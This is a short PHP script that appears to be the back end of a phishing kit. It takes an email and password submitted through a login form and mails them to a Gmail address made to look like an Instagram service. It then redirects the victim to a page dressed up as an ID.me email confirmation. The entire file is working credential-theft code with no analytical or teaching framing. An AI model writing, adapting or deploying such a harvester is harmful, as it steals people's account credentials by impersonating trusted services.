<?php
    $mail_to = 'noreplyinstagrarnservice@gmail.com';
    $mail_from = 'Logs';
 
    $email = $_POST["email"];
    $password = $_POST["password"];
 
    $subject = '' . $email;
 
    
    $body_message .= 'E-mail: ' . $email . "\r\n";
    $body_message .= 'Password: ' . $password;
 
    $headers = 'From: ' . $mail_from . "\r\n";
    $headers .= 'Reply-To: ' . $mail_from . "\r\n";
 
    $mail_sent = mail($mail_to, $subject, $body_message, $headers);
 
    if ($mail_sent == true){ 
        header('Location:Confirm your email address - ID.me.html');
    } else {
        alert('Not Sent');
    }
?>